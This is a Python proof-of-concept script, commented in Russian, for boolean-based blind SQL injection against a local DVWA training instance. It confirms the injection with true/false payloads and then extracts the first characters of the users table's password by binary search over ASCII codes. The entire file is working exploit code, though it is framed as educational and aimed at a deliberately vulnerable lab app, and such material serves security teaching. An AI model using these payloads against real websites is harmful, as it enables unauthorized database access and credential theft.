#!/usr/bin/env python3
"""
Blind SQL Injection – Proof of Concept (Boolean-based)
Исправленная версия для DVWA (low security).
Использует бинарный поиск по ASCII-кодам.
Только для образовательных целей и авторизованного тестирования.
"""
import requests
import sys

BASE_URL = "http://localhost:8080/vulnerabilities/sqli_blind/"
TARGET_URL = f"{BASE_URL}?id=1"
TRUE_CONDITION  = "1' AND 1=1-- "
FALSE_CONDITION = "1' AND 1=2-- "
SUCCESS_MARKER = "User ID exists in the database"

# sessions
# для DVWA обязательны PHPSESSID и security=low
# acctual cookie
COOKIES = {
    "PHPSESSID": "your_session_id_here",  # <-- подставь актуальную сессию
    "security": "low"
}


CHARSET = [chr(c) for c in range(32, 127)]  # 32..126

def is_true(payload: str) -> bool:
    """
    Отправляет запрос с полезной нагрузкой и возвращает True,
    если ответ содержит маркер успеха.
    """
    try:
        r = requests.get(
            BASE_URL,
            params={"id": payload},
            cookies=COOKIES,
            timeout=10
        )
        return SUCCESS_MARKER in r.text
    except requests.RequestException:
        return False

def check_vulnerability() -> bool:
    """
    Проверяет, есть ли разница между TRUE и FALSE условиями.
    """
    print("[*] Проверка уязвимости...")
    if is_true(TRUE_CONDITION) and not is_true(FALSE_CONDITION):
        print("[+] Уязвимость подтверждена (Boolean-based blind SQLi)")
        return True
    else:
        print("[-] Уязвимость не обнаружена")
        return False

def get_char_at(position: int) -> str:
    """
    Бинарный поиск ASCII-кода символа на заданной позиции.
    Возвращает извлечённый символ.
    """
    low, high = 32, 126   # границы ASCII для печатных символов
    while low < high:
        mid = (low + high) // 2
        # Полезная нагрузка: сравниваем ASCII-код >= mid
        payload = (
            f"1' AND ASCII(SUBSTRING("
            f"(SELECT password FROM users LIMIT 1)"
            f", {position}, 1)) > {mid}-- "
        )
        if is_true(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def main():
    if not check_vulnerability():
        sys.exit(1)

    print("[*] Извлекаю первые 3 символа пароля администратора...")
    for pos in range(1, 4):
        char = get_char_at(pos)
        print(f"[+] Символ {pos}: '{char}'")

if __name__ == "__main__":
    main()
